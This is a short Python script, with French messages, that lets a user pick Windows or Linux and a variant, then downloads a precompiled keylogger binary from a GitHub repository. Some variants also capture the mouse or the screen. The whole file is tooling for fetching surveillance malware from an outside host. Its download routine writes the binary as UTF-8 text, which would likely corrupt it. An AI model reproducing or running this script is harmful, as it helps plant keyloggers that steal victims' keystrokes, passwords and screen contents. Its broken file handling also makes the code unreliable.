import requests

keylogger_files = {
1: {  # Windows
        '1': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerWindows", "keyloggerWindows"),
        '2': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerWindowsAvecMouse", "keyloggerWindowsAvecMouse"),
        '3': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerWindowsAvecScreen", "keyloggerWindowsAvecScreen"),
        '4': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerWindowsAvecScreenEtMouse", "keyloggerWindowsAvecScreenEtMouse"),
    },
2: {  # Linux
        '1': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerLinux", "keyloggerLinux"),
        '2': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerLinuxAvecMouse", "keyloggerLinuxAvecMouse"),
        '3': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerLinuxAvecScreen", "keyloggerLinuxAvecScreen"),
        '4': ("https://github.com/ELREBEU/keylogger/raw/refs/heads/main/Compile/keyloggerLinuxAvecScreenEtMouse", "keyloggerLinuxAvecScreenEtMouse"),
    }
}

def downloadFileCompile(os_system, choice):
    if os_system in keylogger_files:
        system_files = keylogger_files[os_system]
        if choice in system_files:
            url, filename = system_files[choice]
            download(url, filename)
        else:
            print("Choix invalide.")
    else:
        print("Système d'exploitation inconnu.")

def download(url, filename):
    response = requests.get(url)
    if response.status_code == 200:
        with open(filename, 'w', encoding='utf-8') as file:
            file.write(response.text)
        print(f"Le fichier {filename} a été téléchargé avec succès.")
    else:
        print(f"Erreur lors du téléchargement de {filename}. Status code: {response.status_code}")



